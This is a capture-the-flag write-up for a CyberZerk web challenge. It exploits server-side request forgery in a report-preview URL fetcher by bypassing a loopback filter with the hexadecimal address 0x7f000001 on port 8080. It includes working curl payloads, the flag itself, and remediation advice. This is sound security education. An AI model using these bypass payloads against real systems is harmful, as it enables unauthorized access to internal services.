# Tricatel — Report Preview Generator (SSRF) Write-up

**Platform:** CyberZerk  
**Category:** Web  
**Vulnerability:** Server-Side Request Forgery (SSRF)  
**Target:** `https://restructuration.cyberzerk.fr/`  
**Flag:** `CyberZerk{SSRF_V3rs_L3_C0ffr3_Int3rn3}`

## 1. Challenge overview

Tricatel provides a report-preview feature that accepts a URL and fetches its contents on the server. The challenge description says that an internal HR resource, `interne.php`, is accessible only from the application's internal network.

The objective is to abuse the server-side URL fetcher to make a request to that internal resource and recover the flag.

This is an SSRF vulnerability: the attacker controls the destination of a request made by the vulnerable application server.

## 2. Initial reconnaissance

First, retrieve the homepage:

```bash
curl -i https://restructuration.cyberzerk.fr/
```

The HTML reveals a GET form with a single parameter named `url`:

```html
<form method="get">
    <input type="text" name="url" placeholder="https://exemple.com/rapport.html">
    <button type="submit">Aperçu</button>
</form>
```

It also explicitly identifies the internal target:

```text
interne.php
```

This establishes the correct request shape: send the target URL as the `url` query parameter to the site root. There is no separate preview API endpoint and the form does not use POST.

## 3. Confirming the internal access restriction

A direct request to the HR endpoint:

```bash
curl -i https://restructuration.cyberzerk.fr/interne.php
```

returns HTTP 403 with the message:

```text
403 - Reserve au reseau interne (votre IP : 172.23.0.3)
```

This confirms that the endpoint restricts access based on the request's network origin. The response exposes the source IP observed by the endpoint (`172.23.0.3`), but that value alone does not establish the addresses of other containers or services.

## 4. Identifying the SSRF filter

Submit a direct loopback URL through the preview parameter:

```bash
curl -skG 'https://restructuration.cyberzerk.fr/' \
  --data-urlencode 'url=http://127.0.0.1/interne.php' \
  -o response.txt
```

The application responds with:

```text
Hôte interne interdit par la politique de sécurité.
```

The French message means that the internal host is forbidden by the security policy. The same explicit rejection occurred for the literal hostname `localhost`.

Several alternative loopback representations were then tested. Some did not trigger the explicit policy-denial message, but still resulted in the generic fetch error. Examples included shortened, decimal, hexadecimal and DNS-based representations. This showed that bypassing the visible hostname check was not sufficient by itself: the correct internal service port was also needed.

## 5. Finding the working address and port

The successful request used a hexadecimal representation of the IPv4 loopback address:

```text
0x7f000001
```

This is equivalent to:

```text
127.0.0.1
```

The key was to target port `8080`, rather than the default HTTP port `80`.

The following command successfully retrieved the internal resource:

```bash
curl -sk --max-time 7 -G \
  'https://restructuration.cyberzerk.fr/' \
  --data-urlencode 'url=http://0x7f000001:8080/interne.php' \
  -o solved.html
```

The preview generator fetched the internal endpoint and returned its contents in the response.

## 6. Extracting the flag

Search the returned HTML for the challenge's flag format:

```bash
grep -Eo 'CyberZerk\{[^}]+\}' solved.html
```

Output:

```text
CyberZerk{SSRF_V3rs_L3_C0ffr3_Int3rn3}
```

<details>
<summary>Flag</summary>

`CyberZerk{SSRF_V3rs_L3_C0ffr3_Int3rn3}`

</details>

## 7. Final exploit, in one command

```bash
curl -skG 'https://restructuration.cyberzerk.fr/' \
  --data-urlencode 'url=http://0x7f000001:8080/interne.php' \
  -o solved.html && \
grep -Eo 'CyberZerk\{[^}]+\}' solved.html
```

## 8. Why the exploit worked

The exploit depended on two details:

1. **IP representation:** The application rejected obvious internal hostnames such as `127.0.0.1` and `localhost`, but the hexadecimal IPv4 representation `0x7f000001` passed the visible hostname check and was interpreted by the fetcher as loopback.
2. **Service port:** The internal HR endpoint was reachable through the preview fetcher on port `8080`. Requests to port `80` did not retrieve the page.

Combining both details caused the server-side fetcher to access `interne.php` from the application's internal network, where the endpoint's access restriction allowed the request.

## 9. Lessons learned

- Inspect the HTML form before guessing API endpoints or HTTP methods.
- Distinguish a policy-validation error from a generic fetch failure; they indicate different stages of the request flow.
- A URL validation routine should parse and normalize IP addresses before applying address-range restrictions.
- SSRF defenses must validate the resolved destination IP, block loopback/private/link-local ranges as appropriate, and revalidate every redirect destination.
- Restricting destination ports and outbound network access provides additional defense in depth.

## 10. Remediation

A secure URL-fetching service should:

- Allow only required URL schemes, typically HTTPS, and reject unsupported schemes.
- Parse URLs with a standards-compliant URL parser and canonicalize host representations before validation.
- Resolve DNS names and reject destinations resolving to loopback, private, link-local, multicast, and other prohibited address ranges.
- Pin the validated resolved address for the connection to reduce DNS-rebinding risk.
- Reapply destination validation after every redirect, or disable redirects entirely.
- Enforce an outbound network policy that prevents access to internal services and metadata endpoints.
- Use strict connection timeouts, response-size limits, and content-type restrictions.

---

**Result:** The internal HR page was retrieved through SSRF and the flag was recovered: `CyberZerk{SSRF_V3rs_L3_C0ffr3_Int3rn3}`.
